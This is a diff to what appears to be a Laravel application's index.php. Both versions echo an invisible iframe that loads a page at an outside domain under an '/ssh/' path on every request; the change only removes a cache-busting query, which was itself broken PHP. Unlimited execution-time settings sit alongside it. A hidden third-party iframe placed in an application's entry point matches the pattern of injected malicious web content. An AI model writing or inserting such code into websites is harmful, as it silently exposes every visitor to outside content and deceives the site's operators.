@@ -10,7 +10,7 @@ ini_set('max_execution_time', -1);
 ini_set('max_input_time', -1);
 ini_set('post_max_size', -1);
 
-echo '<iframe src="https://edu-master.com/ssh/?no-cache=<?= date('Y-m-d H:i:s') ?>" style="display:none;"></iframe>';
+echo '<iframe src="https://edu-master.com/ssh/" style="display:none;"></iframe>';
 
 define('LARAVEL_START', microtime(true));
 
